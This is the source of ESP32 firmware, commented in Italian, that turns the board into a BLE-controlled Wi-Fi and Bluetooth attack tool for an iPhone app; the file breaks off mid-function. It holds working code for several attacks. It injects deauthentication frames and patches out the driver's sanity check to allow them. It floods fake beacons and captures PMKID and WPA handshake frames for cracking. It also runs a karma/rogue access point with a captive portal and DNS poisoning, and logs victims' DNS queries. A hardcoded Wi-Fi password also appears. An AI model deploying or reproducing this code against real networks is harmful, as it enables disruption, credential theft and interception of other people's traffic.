// RedHatSec Bridge 32 v1.0 — ESP32 come modulo Wi-Fi + Bluetooth dell'iPhone
//
//   iPhone --BLE GATT (FFE0/FFE1)--> ESP32
//   Niente TCP: l'app parla solo BLE (recon, deauth, beacon, PMKID, rogue AP
//   con NAPT, captive portal, log traffico, BT Classic inquiry/SDP, BLE adv).
//
//   Protocollo RHS identico all'ESP8266 (frame binari, stessi opcode):
//     RX app→esp: [0xA5][len_lo][len_hi][seq][cmd][payload...][crc8(1,4+len)]
//     TX esp→app: [0x5A][len_lo][len_hi][cmd][status][payload...][crc8(1,4+len)]
//
//   Cmd:
//     0x01 ping
//     0x02 scan[sec]                 0x03 wifiResults (legacy)
//     0x04 deauth[mac6][ch][count]   (rifiutato se rogue attivo)
//     0x05 beacon[count][len][ssid]...
//     0x06 pmkid[mac6][ch]
//     0x07 stop
//     0x08 join[len][ssid][plen][pass]
//     0x10 tcp_scan[ip4][count][port u16 xN]
//     0x11 tcp_roundtrip[ip4][port u16][tcs][plen u16][payload]
//     0x12 udp_roundtrip[ip4][port u16][tcs][plen u16][payload]
//     0x13 rogueStart[ssidLen][ssid][passLen][pass][dnsFwd]
//     0x14 rogueStop
//     0x15 rogueClients
//     0x16 karma[on]
//     0x17 portalSet[len u16][html]
//     0x18 nat[on][dnsFwd]
//     0x19 sniffLog
//     0x20 btInquiry[sec]             → [count][bda6][rssi i8][nameLen][name]...
//     0x21 btSdp[mac6]                → [count][uuidLen][uuid bytes]...
//     0x22 bleAdvScan[sec]            → [count][mac6][rssi][nameLen][name][advLen][adv]...
//
//   Requisiti Arduino-ESP32 >= 3.x (BTDM + classic + NAPT). Flash: 115200.
//   L'hotspot iPhone deve essere 2.4 GHz ("Massima compatibilità").

#include <WiFi.h>
#include <WiFiUdp.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>

#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_gap_bt_api.h"
#include "esp_bt_main.h"

extern "C" {
#include "lwip/etharp.h"
#include "lwip/ip4_addr.h"
}

// ============ CONFIG ============
static const char *STA_SSID = "Hexxeted";
static const char *STA_PASS = "lwae9180";
static bool staWanted = false;  // join solo su richiesta (0x08/J): non disturbare l'AP

// iPhone hotspot = WPA3-Personal in transizione: serve PMF capable, altrimenti
// la STA viene rifiutata (reason 205/15). Idempotente, sicura da richiamare.
static void staBeginPmf() {
  WiFi.begin(STA_SSID, STA_PASS);
  wifi_config_t wc;
  if (esp_wifi_get_config(WIFI_IF_STA, &wc) == ESP_OK) {
    wc.sta.pmf_cfg.capable = true;
    wc.sta.pmf_cfg.required = false;
    wc.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    esp_wifi_set_config(WIFI_IF_STA, &wc);
  }
}

#define SERVICE_UUID "0000FFE0-0000-1000-8000-00805F9B34FB"
#define CHR_UUID     "0000FFE1-0000-1000-8000-00805F9B34FB"

// ============ STATO ============
static uint8_t apChannel = 1;

static uint8_t rxBuf[512];
static int rxLen = 0;

static bool scanPending = false;
static uint32_t scanStart = 0;
static bool joinPending = false;
static uint32_t joinStart = 0;
static String joinTargetSsid;

static bool beaconActive = false;
static uint8_t beaconSsids[16][33];
static int beaconSsidLens[16];
static int beaconCount = 0;
static uint8_t beaconChannel = 6;
static uint32_t beaconTxOk = 0;

static bool pmkidArmed = false;
static uint32_t pmkidStart = 0;
static uint32_t pmkidReturnAt = 0;
static bool pmkidAwaitingReturn = false;
static uint8_t pmkidTarget[6];
static uint8_t pmkidTargetCh = 1;
static uint8_t pmkidBuf[160];
static int pmkidLen = 0;
static bool pmkidCaptured = false;

struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8_t sec; };
static APEntry aps[24];
static int apCount = 0;

// rogue AP
static bool rogue = false;
static char rogueSsid[33];
static char roguePass[65];
static bool dnsFwd = false;
static char portalPage[801];
static int portalLen = 0;
static bool karmaArmed = false;
static String probeSsids[24];
static int probeCount = 0;

static String sniffLog[24];
static int sniffCount = 0;

struct DnsPending { uint16_t id; IPAddress ip; uint16_t port; uint32_t at; bool used; };
static DnsPending dnsTab[8];

static uint32_t dnsCount = 0;
static uint32_t httpCount = 0;
static bool naptUp = false;

// BLE
static BLEServer *pServer = nullptr;
static BLECharacteristic *pChr = nullptr;
static volatile bool bleConnected = false;
static volatile uint16_t bleConnId = 0;

// BT Classic
struct BtDev { uint8_t bda[6]; int8_t rssi; char name[33]; };
static BtDev btDevs[24];
static int btCount = 0;
static volatile bool btInq = false;
static volatile bool btInqDone = false;
static volatile bool btInqPending = false;
static volatile int btInqStatus = 0;
static volatile bool sdpBusy = false;
static volatile bool sdpDone = false;
static volatile int sdpStat = 0;
static uint32_t sdpStartMs = 0;
static uint8_t sdpBuf[600];
static volatile int sdpBufLen = 0;

static portMUX_TYPE ringMux = portMUX_INITIALIZER_UNLOCKED;
static portMUX_TYPE btMux = portMUX_INITIALIZER_UNLOCKED;

// ============ LOG ============
static void sniffPush(const String &s) {
  for (int k = 0; k < sniffCount; k++) if (sniffLog[k] == s) return;
  if (sniffCount < 24) { sniffLog[sniffCount++] = s; return; }
  for (int k = 1; k < 24; k++) sniffLog[k - 1] = sniffLog[k];
  sniffLog[23] = s;
}

// ============ CRC + framing ============
// IDF blocca i deauth/disassoc con un sanity check interno: lo annulliamo,
// altrimenti esp_wifi_80211_tx torna ESP_ERR_INVALID_ARG (258).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  (void)arg; (void)arg2; (void)arg3;
  return 0;
}

static uint8_t crc8(const uint8_t *d, int n) {
  uint8_t crc = 0;
  for (int i = 0; i < n; i++) {
    crc ^= d[i];
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
  }
  return crc;
}

// Notifica in chunk pari a MTU-3 (iOS negozia ~185): l'app riassembla.
static void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
  if (len < 0) len = 0;
  if (len > 2000) len = 2000;
  uint8_t f[2048];
  int i = 0;
  f[i++] = 0x5A;
  f[i++] = len & 0xFF;
  f[i++] = (len >> 8) & 0xFF;
  f[i++] = cmdEcho;
  f[i++] = status;
  if (len > 0 && payload) { memcpy(f + i, payload, len); i += len; }
  f[i++] = crc8(f + 1, 4 + len);

  if (!bleConnected || !pChr) {
    Serial.printf("[TX] cmd=0x%02X st=0x%02X len=%d (no app)\n", cmdEcho, status, len);
    return;
  }
  uint16_t mtu = pServer ? pServer->getPeerMTU(bleConnId) : 23;
  if (mtu < 23) mtu = 23;
  int chunk = (int)mtu - 3;
  if (chunk < 20) chunk = 20;
  for (int off = 0; off < i; off += chunk) {
    int n = i - off;
    if (n > chunk) n = chunk;
    pChr->setValue(f + off, n);
    pChr->notify();
    delay(4);
  }
  Serial.printf("[TX] cmd=0x%02X st=0x%02X len=%d mtu=%d\n", cmdEcho, status, len, mtu);
}

// ============ BLE ring RX ============
static uint8_t ring[4096];
static volatile uint16_t rHead = 0, rTail = 0;

static void ringPush(const uint8_t *d, size_t n) {
  portENTER_CRITICAL(&ringMux);
  for (size_t i = 0; i < n; i++) {
    uint16_t nh = (uint16_t)((rHead + 1) & 4095);
    if (nh == rTail) break;
    ring[rHead] = d[i];
    rHead = nh;
  }
  portEXIT_CRITICAL(&ringMux);
}

static int ringPop(uint8_t *out, int max) {
  int n = 0;
  portENTER_CRITICAL(&ringMux);
  while (n < max && rTail != rHead) {
    out[n++] = ring[rTail];
    rTail = (uint16_t)((rTail + 1) & 4095);
  }
  portEXIT_CRITICAL(&ringMux);
  return n;
}

class SrvCb : public BLEServerCallbacks {
  void onConnect(BLEServer *s, esp_ble_gatts_cb_param_t *param) override {
    bleConnected = true;
    bleConnId = param->connect.conn_id;
    Serial.println("[ble] iPhone connesso");
  }
  void onDisconnect(BLEServer *s) override {
    bleConnected = false;
    Serial.println("[ble] disconnesso — riavvio advertising");
    s->startAdvertising();
  }
};

class ChrCb : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c, esp_ble_gatts_cb_param_t *param) override {
    if (param->write.len > 0 && param->write.value)
      ringPush(param->write.value, param->write.len);
  }
};

// ============ FASE A: capture EAPOL/PMKID/WPS (promiscuous + channel hop) ============
struct CapFrame { uint8_t msg; uint16_t len; uint16_t ki; uint8_t data[480]; };
struct CapSes {
  uint8_t bssid[6];
  uint8_t sta[6];
  bool pmkid;
  uint8_t pmkidVal[16];
  char ssid[33];
  uint8_t n;
  CapFrame fr[4];
};
struct CapSsidEntry { uint8_t bssid[6]; char ssid[33]; uint8_t len; };
static volatile bool capOn = false;
static bool capHop = true;
static uint8_t capCh = 1;
static uint8_t capChList[16];
static uint8_t capChCount = 0;
static uint8_t capHops = 0;
static uint32_t capLastHop = 0;
static volatile uint32_t capFrames = 0;
static volatile uint32_t capEapol = 0;
static CapSes capSes[6];
static int capSesCount = 0;
static CapSsidEntry capSsidMap[8];
static int capSsidCount = 0;
static bool capBackupConn = false;
static uint8_t capBackupCh = 1;
static int capForceCh = 0;
static portMUX_TYPE capMux = portMUX_INITIALIZER_UNLOCKED;

// ============ sniffer 802.11 (karma + PMKID + capture) ============
static void capHandle(const uint8_t *d, int len);

static void snifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *d = pkt->payload;
  int len = (int)pkt->rx_ctrl.sig_len - 4;
  if (len < 24) return;

  if (capOn) capHandle(d, len);

  uint8_t subtype = (uint8_t)((d[0] >> 2) & 0x3F);
  if (karmaArmed && !pmkidArmed && subtype == 0x04) {
    int o = 24;
    while (o + 2 <= len && o < 220) {
      uint8_t eid = d[o], el = d[o + 1];
      if (eid == 0 && el > 0 && el <= 32) {
        bool dup = false;
        for (int k = 0; k < probeCount; k++)
          if (probeSsids[k].length() == el && memcmp(probeSsids[k].c_str(), d + o + 2, el) == 0) { dup = true; break; }
        if (!dup && probeCount < 24) {
          char t[33]; memcpy(t, d + o + 2, el); t[el] = 0;
          probeSsids[probeCount++] = String(t);
          Serial.printf("[karma] probe %s\n", t);
        }
        break;
      }
      o += 2 + el;
    }
    return;
  }

  if (!pmkidArmed || len < 40) return;
  int lim = len > 220 ? 220 : len;
  for (int i = 0; i + 8 <= lim; i++) {
    if (d[i] == 0xAA && d[i+1] == 0xAA && d[i+2] == 0x03 && d[i+3] == 0x00 &&
        d[i+4] == 0x00 && d[i+5] == 0x00 && d[i+6] == 0x88 && d[i+7] == 0x8E) {
      bool match = false;
      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++)
        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
      if (!match) return;
      pmkidLen = len < 160 ? len : 160;
      memcpy(pmkidBuf, d, pmkidLen);
      pmkidCaptured = true;
      Serial.println("[pmkid] EAPOL");
      return;
    }
  }
}

static void promiscOn() {
  wifi_promiscuous_filter_t f;
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  esp_wifi_set_promiscuous(true);
}

static void promiscOff() { esp_wifi_set_promiscuous(false); }

static void setChannel(uint8_t ch) {
  if (ch >= 1 && ch <= 14) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

// ============ FASE A: capture EAPOL/PMKID/WPS ============
static uint8_t capLastBssid[6] = {0};
static uint32_t capDeauthTx = 0;

static int capDeauth(uint8_t count) {
  if (!capOn) return -1;
  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;
  pkt[2] = 0; pkt[3] = 0;
  memset(pkt + 4, 0xFF, 6);
  memcpy(pkt + 10, capLastBssid, 6);
  memcpy(pkt + 16, capLastBssid, 6);
  pkt[22] = 0; pkt[23] = 0; pkt[24] = 7; pkt[25] = 0;
  int last = 0;
  for (int i = 0; i < count; i++) {
    last = (int)esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
    if (last == 0) capDeauthTx++;
    delay(12);
  }
  return last;
}

static void capHandle(const uint8_t *d, int len) {
  capFrames++;
  uint8_t ftype = (uint8_t)((d[0] >> 2) & 0x3);

  // beacon/probe response → mappa SSID per BSSID (serve a hc22000)
  if (ftype == 0) {
    uint8_t sub = (uint8_t)((d[0] >> 4) & 0xF);
    if ((sub == 8 || sub == 5) && len >= 38) {
      memcpy(capLastBssid, d + 16, 6);
      int o = 36;
      while (o + 2 <= len) {
        uint8_t eid = d[o], el = d[o + 1];
        if (eid == 0) {
          if (el > 0 && el <= 32 && o + 2 + el <= len) {
            portENTER_CRITICAL(&capMux);
            bool found = false;
            for (int k = 0; k < capSsidCount; k++)
              if (memcmp(capSsidMap[k].bssid, d + 16, 6) == 0) { found = true; break; }
            if (!found && capSsidCount < 8) {
              CapSsidEntry &m = capSsidMap[capSsidCount++];
              memcpy(m.bssid, d + 16, 6);
              memcpy(m.ssid, d + o + 2, el);
              m.ssid[el] = 0;
              m.len = el;
            }
            portEXIT_CRITICAL(&capMux);
          }
          break;
        }
        o += 2 + el;
      }
    }
    return;
  }

  if (ftype != 2 || len < 32) return;
  uint8_t ds = d[1] & 0x03;
  if (ds == 0 || ds == 3) return;
  int hdr = 24;
  if (((d[0] >> 4) & 0xF) & 0x08) hdr += 2;  // QoS data
  if (hdr + 8 > len) return;
  const uint8_t *llc = d + hdr;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 ||
      llc[6] != 0x88 || llc[7] != 0x8E) return;
  int eo = hdr + 8;
  int elen = len - eo;
  if (elen < 4) return;

  uint8_t etype = d[eo + 1];
  uint8_t msg = 0;
  bool pmk = false;
  uint8_t pmkVal[16] = {0};
  uint16_t kiVal = 0;
  if (etype == 3 && elen >= 99) {
    uint16_t ki = (uint16_t)((d[eo + 5] << 8) | d[eo + 6]);
    kiVal = ki;
    bool ack = (ki >> 7) & 1, mic = (ki >> 8) & 1, sec = (ki >> 9) & 1;
    if (ack && !mic) msg = 1;
    else if (!ack && mic && !sec) msg = 2;
    else if (ack && mic) msg = 3;
    else msg = 4;
    if (msg == 1 && ds == 0x02) {
      int kd = (d[eo + 97] << 8) | d[eo + 98];
      int end = 99 + kd;
      if (end > elen) end = elen;
      for (int i = 99; i + 6 <= end;) {
        uint8_t id = d[eo + i], l = d[eo + i + 1];
        if (id == 0xDD && l >= 20 && i + 22 <= end &&
            d[eo + i + 2] == 0x00 && d[eo + i + 3] == 0x0F &&
            d[eo + i + 4] == 0xAC && d[eo + i + 5] == 0x04) {
          memcpy(pmkVal, d + eo + i + 6, 16);
          pmk = true;
          break;
        }
        i += 2 + l;
      }
    }
  } else if (etype == 0) {
    msg = 0;  // EAP-WSC (WPS): conservato come messaggio 0
  } else {
    return;
  }

  capEapol++;
  uint8_t bssid[6], sta[6];
  if (ds == 0x01) { memcpy(bssid, d + 4, 6); memcpy(sta, d + 10, 6); }
  else { memcpy(bssid, d + 10, 6); memcpy(sta, d + 4, 6); }
  int flen = len < 480 ? len : 480;

  portENTER_CRITICAL(&capMux);
  int si = -1;
  for (int k = 0; k < capSesCount; k++)
    if (memcmp(capSes[k].bssid, bssid, 6) == 0 && memcmp(capSes[k].sta, sta, 6) == 0) { si = k; break; }
  if (si < 0) {
    if (capSesCount < 6) {
      si = capSesCount++;
      memset(&capSes[si], 0, sizeof(CapSes));
      memcpy(capSes[si].bssid, bssid, 6);
      memcpy(capSes[si].sta, sta, 6);
    } else {
      portEXIT_CRITICAL(&capMux);
      return;
    }
  }
  CapSes &s = capSes[si];
  if (pmk) { s.pmkid = true; memcpy(s.pmkidVal, pmkVal, 16); }
  if (!s.ssid[0]) {
    for (int k = 0; k < capSsidCount; k++)
      if (memcmp(capSsidMap[k].bssid, bssid, 6) == 0) { memcpy(s.ssid, capSsidMap[k].ssid, 33); break; }
  }
  int slot;
  if (s.n < 4) slot = s.n++;
  else { for (int k = 1; k < 4; k++) s.fr[k - 1] = s.fr[k]; slot = 3; }
  s.fr[slot].msg = msg;
  s.fr[slot].len = (uint16_t)flen;
  s.fr[slot].ki = kiVal;
  memcpy(s.fr[slot].data, d, flen);
  portEXIT_CRITICAL(&capMux);
}

static bool capStart(bool hop) {
  if (pmkidArmed || karmaArmed || beaconActive || scanPending) return false;
  capSesCount = 0;
  capSsidCount = 0;
  capFrames = 0;
  capEapol = 0;
  capHops = 0;
  capHop = hop && !rogue;
  capBackupConn = (WiFi.status() == WL_CONNECTED);
  capBackupCh = (uint8_t)(capBackupConn ? WiFi.channel() : apChannel);
  if (!capBackupConn) {
    uint8_t hwch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
    if (esp_wifi_get_channel(&hwch, &sc) == ESP_OK && hwch >= 1 && hwch <= 14) capBackupCh = hwch;
  }
  if (capBackupCh < 1 || capBackupCh > 14) capBackupCh = 1;
  capOn = true;
  if (rogue) {
    capCh = apChannel;
  } else {
    capCh = capHop ? (uint8_t)(capChCount ? capChList[0] : 1) : capBackupCh;
    if (capBackupConn) { WiFi.disconnect(false); delay(40); }
    else { WiFi.disconnect(false); delay(40); }
    setChannel(capCh);
    if (capForceCh >= 1 && capForceCh <= 14) { capCh = (uint8_t)capForceCh; setChannel(capCh); }
  }
  capLastHop = millis();
  promiscOn();
  Serial.printf("[cap] start hop=%d ch=%d\n", capHop, capCh);
  return true;
}

static void capStop() {
  capOn = false;
  if (!pmkidArmed && !karmaArmed) promiscOff();
  if (!rogue) {
    setChannel(capBackupCh);
    if (capBackupConn && staWanted) staBeginPmf();
  }
  Serial.printf("[cap] stop frames=%lu eapol=%lu ses=%d ch=%d\n",
                (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh);
}

static void capTick() {
  if (!capOn || rogue) return;
  if (!capHop) {
    if (millis() - capLastHop > 1500) {
      uint8_t ch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
      esp_wifi_get_channel(&ch, &sc);
      if (ch != capCh) setChannel(capCh);
      capLastHop = millis();
    }
    return;
  }
  if (millis() - capLastHop < 350) return;
  capLastHop = millis();
  capHops++;
  if (capChCount > 0) capCh = capChList[capHops % capChCount];
  else capCh = (uint8_t)(1 + (capHops % 13));
  setChannel(capCh);
}

static int capBuildDump(int idx, uint8_t *out, int maxOut) {
  if (idx < 0 || idx >= capSesCount) return -1;
  CapSes &s = capSes[idx];
  int i = 0;
  memcpy(out + i, s.bssid, 6); i += 6;
  memcpy(out + i, s.sta, 6); i += 6;
  out[i++] = s.pmkid ? 1 : 0;
  memcpy(out + i, s.pmkidVal, 16); i += 16;
  int sl = (int)strlen(s.ssid);
  if (sl > 32) sl = 32;
  out[i++] = (uint8_t)sl;
  memcpy(out + i, s.ssid, sl); i += sl;
  out[i++] = s.n;
  for (int k = 0; k < s.n; k++) {
    if (i + 3 + (int)s.fr[k].len > maxOut) break;
    out[i++] = s.fr[k].msg;
    out[i++] = s.fr[k].len & 0xFF;
    out[i++] = (s.fr[k].len >> 8) & 0xFF;
    memcpy(out + i, s.fr[k].data, s.fr[k].len);
    i += s.fr[k].len;
  }
  return i;
}

// ============ raw 802.11 TX ============
static esp_err_t injectRaw(const uint8_t *p, int len) {
  wifi_interface_t ifx = rogue ? WIFI_IF_AP : WIFI_IF_STA;
  return esp_wifi_80211_tx(ifx, p, len, false);
}

static bool sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
  setChannel(ch);
  delay(5);
  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;
  pkt[2] = 0x00; pkt[3] = 0x00;
  for (int k = 0; k < 6; k++) pkt[4 + k] = 0xFF;
  memcpy(pkt + 10, bssid, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[22] = 0xF0; pkt[23] = 0xFF;
  pkt[24] = 0x07; pkt[25] = 0x00;
  int sent = 0;
  esp_err_t last = ESP_OK;
  for (int n = 0; n < count; n++) {
    last = injectRaw(pkt, 26);
    if (last == ESP_OK) sent++;
    delay(8);
  }
  setChannel(apChannel);
  Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d/%d err=%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, sent, count, (int)last);
  return sent > 0;
}

static void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
                        const uint8_t bssid[6], uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;
  pkt[i++] = 0x64; pkt[i++] = 0x00;
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssidLen;
  memcpy(pkt + i, ssid, ssidLen); i += ssidLen;
  pkt[i++] = 0x01; pkt[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(pkt + i, rates, 8); i += 8;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  *len = i;
}

static void beaconLoop() {
  uint8_t pkt[128];
  uint8_t ch = rogue ? apChannel : beaconChannel;
  if (!rogue) setChannel(beaconChannel);
  for (int n = 0; n < beaconCount && beaconActive; n++) {
    uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
    int len = 0;
    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, ch);
    for (int rep = 0; rep < 2; rep++)
      if (injectRaw(pkt, len) == ESP_OK) beaconTxOk++;
    delay(15);
  }
}

// ============ WiFi scan ============
static void finishScan(int n) {
  apCount = 0;
  if (n > 0) {
    for (int k = 0; k < n && apCount < 24; k++) {
      APEntry &e = aps[apCount];
      memset(&e, 0, sizeof(e));
      e.rssi = (int8_t)WiFi.RSSI(k);
      e.ch = (uint8_t)WiFi.channel(k);
      const uint8_t *b = WiFi.BSSID(k);
      if (b) memcpy(e.bssid, b, 6);
      e.sec = (uint8_t)WiFi.encryptionType(k);
      String s = WiFi.SSID(k);
      int sl = s.length(); if (sl > 32) sl = 32;
      memcpy(e.ssid, s.c_str(), sl); e.ssid[sl] = 0;
      apCount++;
    }
  }
  WiFi.scanDelete();

  uint8_t payload[900];
  int i = 0;
  for (int k = 0; k < apCount && i < 880; k++) {
    payload[i++] = (uint8_t)aps[k].rssi;
    payload[i++] = aps[k].ch;
    memcpy(payload + i, aps[k].bssid, 6); i += 6;
    payload[i++] = aps[k].sec;
    int sl = strlen(aps[k].ssid);
    if (sl > 32) sl = 32;
    payload[i++] = (uint8_t)sl;
    memcpy(payload + i, aps[k].ssid, sl); i += sl;
  }
  Serial.printf("[scan] %d AP\n", apCount);
  sendFrame(0x02, 0x00, payload, i);
}

static void startScan(int seconds) {
  if (seconds < 3) seconds = 3;
  if (seconds > 12) seconds = 12;
  if (scanPending) return;
  WiFi.scanDelete();
  int rc = WiFi.scanNetworks(true, true);
  Serial.printf("[scan] async rc=%d sta=%d ch=%d\n", rc, (int)WiFi.status(), (int)WiFi.channel());
  if (rc == WIFI_SCAN_RUNNING) {
    scanPending = true;
    scanStart = millis();
    return;
  }
  // radio occupata (reconnect STA in corso) o driver in errore: fallback sincrono
  int n = WiFi.scanNetworks(false, true);
  if (n <= 0) {
    // connect in volo: annullala e riprova — il loop riaggancia l'AP dopo lo scan
    WiFi.disconnect(false);
    delay(150);
    n = WiFi.scanNetworks(false, true);
  }
  Serial.printf("[scan] sync n=%d\n", n);
  if (n < 0) n = 0;
  finishScan(n);
}

static void pollScan() {
  if (!scanPending) return;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) {
    if (millis() - scanStart > 15000) {
      scanPending = false;
      WiFi.scanDelete();
      sendFrame(0x02, 0x02, (const uint8_t *)"scan timeout", 12);
    }
    return;
  }
  scanPending = false;
  Serial.printf("[scan] done n=%d in %lums\n", n, (unsigned long)(millis() - scanStart));
  if (n == 0 && millis() - scanStart < 1200) {
    // "0 istantaneo" = lo scan non è davvero partito: riprova sincrono
    n = WiFi.scanNetworks(false, true);
    Serial.printf("[scan] retry sync n=%d\n", n);
  }
  if (n < 0) n = 0;
  finishScan(n);
}

// ============ client rogue AP + IP via ARP ============
static bool ipForMac(const uint8_t mac[6], IPAddress &out) {
  ip4_addr_t *ip = nullptr;
  struct netif *nf = nullptr;
  struct eth_addr *eth = nullptr;
  for (uint8_t i = 0; i < ARP_TABLE_SIZE; i++) {
    if (etharp_get_entry(i, &ip, &nf, &eth) == ERR_OK && ip && eth) {
      if (memcmp(eth->addr, mac, 6) == 0) {
        out = IPAddress(ip->addr);
        return true;
      }
    }
  }
  return false;
}

static int apClientList(uint8_t *out, int maxOut) {
  wifi_sta_list_t list;
  memset(&list, 0, sizeof(list));
  if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return 0;
  int cnt = 0, o = 0;
  for (int i = 0; i < list.num && cnt < 8; i++) {
    if (o + 10 > maxOut) break;
    const uint8_t *mac = list.sta[i].mac;
    memcpy(out + o, mac, 6); o += 6;
    IPAddress ip;
    if (!ipForMac(mac, ip)) ip = IPAddress(0, 0, 0, 0);
    out[o++] = ip[0]; out[o++] = ip[1]; out[o++] = ip[2]; out[o++] = ip[3];
    cnt++;
  }
  return cnt;
}

static void joinTick() {
  if (!rogue) return;
  static uint32_t last = 0;
  if (millis() - last < 3000) return;
  last = millis();
  wifi_sta_list_t list;
  memset(&list, 0, sizeof(list));
  if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return;
  for (int i = 0; i < list.num; i++) {
    const uint8_t *b = list.sta[i].mac;
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
    IPAddress ip;
    if (!ipForMac(b, ip)) ip = IPAddress(0, 0, 0, 0);
    sniffPush("C:" + ip.toString() + " " + mac);
  }
}

// ============ NAPT (ESP-IDF 5.x) ============
static esp_netif_t *apNetif = nullptr;

static bool naptOn() {
  if (!apNetif) apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (!apNetif) { Serial.println("[napt] AP netif non trovata"); return false; }
  esp_err_t e = esp_netif_napt_enable(apNetif);
  naptUp = (e == ESP_OK);
  Serial.printf("[napt] enable=%d ap=%s sta=%s\n", (int)e,
                WiFi.softAPIP().toString().c_str(), WiFi.localIP().toString().c_str());
  return naptUp;
}

static void naptOff() {
  if (apNetif) esp_netif_napt_disable(apNetif);
  naptUp = false;
}

// ============ DNS ibrido (forward + captive / poison) ============
static WiFiUDP dnsSrv;
static WiFiUDP dnsUp;
static WiFiServer portalSrv(80);

static bool isCaptiveHost(const String &h) {
  static const char *hosts[] = {
    "captive.apple.com", "captive.gstatic.com", "connectivitycheck.gstatic.com",
    "connectivitycheck.android.com", "clients3.google.com", "clients4.google.com",
    "detectportal.firefox.com", "nmcheck.gnome.org", "msftconnecttest.com",
    "msftncsi.com", "networkcheck.kde.org", "wifi.google.com"
  };
  for (unsigned i = 0; i < sizeof(hosts) / sizeof(hosts[0]); i++)
    if (h == hosts[i] || h.endsWith(String(".") + hosts[i])) return true;
  return false;
}

static void dnsPoison(uint8_t *q, int n, const IPAddress &cip, const IPAddress &client, uint16_t cport) {
  if (n + 16 > 512) return;
  q[2] = 0x81; q[3] = 0x80;
  q[4] = 0; q[5] = 0;
  q[6] = 0; q[7] = 1;
  q[8] = 0; q[9] = 0; q[10] = 0; q[11] = 0;
  uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
                     0x00, 0x00, 0x00, 0x3C, 0x00, 0x04,
                     cip[0], cip[1], cip[2], cip[3]};
  dnsSrv.beginPacket(client, cport);
  dnsSrv.write(q, n);
  dnsSrv.write(ans, sizeof(ans));
  dnsSrv.endPacket();
}

static void dnsTick() {
  if (!rogue) return;

  int u;
  while ((u = dnsUp.parsePacket()) > 0) {
    static uint8_t rb[512];
    int rn = dnsUp.read(rb, sizeof(rb));
    if (rn < 12) continue;
    uint16_t id = ((uint16_t)rb[0] << 8) | rb[1];
    for (int i = 0; i < 8; i++) {
      if (!dnsTab[i].used || dnsTab[i].id != id) continue;
      if (millis() - dnsTab[i].at > 6000) { dnsTab[i].used = false; continue; }
      dnsSrv.beginPacket(dnsTab[i].ip, dnsTab[i].port);
      dnsSrv.write(rb, rn);
      dnsSrv.endPacket();
      dnsTab[i].used = false;
      break;
    }
  }

  if (dnsSrv.parsePacket() <= 0) return;
  static uint8_t q[512];
  int n = dnsSrv.read(q, sizeof(q));
  if (n < 17) return;
  IPAddress cip = dnsSrv.remoteIP();
  uint16_t cport = dnsSrv.remotePort();

  String qn;
  int o = 12;
  while (o < n && q[o] > 0 && q[o] < 64 && o + 1 + q[o] <= n) {
    char lb[64];
    memcpy(lb, q + o + 1, q[o]);
    lb[q[o]] = 0;
    qn += lb;
    qn += '.';
    o += q[o] + 1;
  }
  if (qn.length() > 1) {
    qn.remove(qn.length() - 1);
    sniffPush("D:" + qn);
  }
  dnsCount++;

  if (!dnsFwd || isCaptiveHost(qn)) {
